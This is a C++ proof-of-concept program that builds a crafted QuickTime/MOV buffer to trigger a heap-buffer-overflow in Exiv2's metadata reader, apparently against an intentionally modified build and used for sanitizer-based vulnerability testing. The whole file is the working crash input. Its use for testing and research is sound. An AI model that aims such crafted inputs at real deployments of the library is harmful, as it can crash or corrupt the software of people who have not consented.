/*
 * Proof-of-concept driver for a delocalized heap-buffer-overflow in the
 * Exiv2 QuickTime/MOV metadata reader.
 *
 * The defect is reached entirely through the public API: an in-memory image
 * buffer is handed to Exiv2::ImageFactory::open(const byte*, size_t) and then
 * Image::readMetadata() parses it. No private/internal symbols are used.
 *
 * Crafted input: a minimal QuickTime stream consisting of
 *   1. an "ftyp" atom (brand "M4V ") so the buffer is recognised as QuickTime,
 *   2. a "name" atom whose 64-byte payload is read straight into the shared
 *      scratch buffer of QuickTimeVideo::decodeBlock().
 *
 * On the resulting tree the scratch buffer is only 5 bytes (bufMinSize + 1),
 * because decodeBlock() no longer grows it, so reading the 64-byte "name"
 * payload into it overflows the heap allocation and AddressSanitizer aborts.
 *
 * Exiv2 is a C++ library whose public headers are C++; this driver is compiled
 * with the C++ toolchain of the sanitizer build.
 */
#include <exiv2/exiv2.hpp>

#include <cstdint>
#include <vector>

int main(void) {
  std::vector<uint8_t> data;

  auto push_be32 = [&](uint32_t v) {
    data.push_back(static_cast<uint8_t>(v >> 24));
    data.push_back(static_cast<uint8_t>(v >> 16));
    data.push_back(static_cast<uint8_t>(v >> 8));
    data.push_back(static_cast<uint8_t>(v));
  };
  auto push_tag = [&](const char* t) {
    for (int i = 0; i < 4; ++i)
      data.push_back(static_cast<uint8_t>(t[i]));
  };

  /* ftyp atom: size = 16, major brand "M4V ", minor version 0 */
  push_be32(16);
  push_tag("ftyp");
  push_tag("M4V ");
  push_be32(0);

  /* name atom: size = 8 (header) + 64 (payload) = 72 */
  push_be32(72);
  push_tag("name");
  for (int i = 0; i < 64; ++i)
    data.push_back(static_cast<uint8_t>('A' + (i % 26)));

  auto image = Exiv2::ImageFactory::open(data.data(), data.size());
  image->readMetadata();  /* overflows the QuickTime scratch buffer here */

  return 0;
}
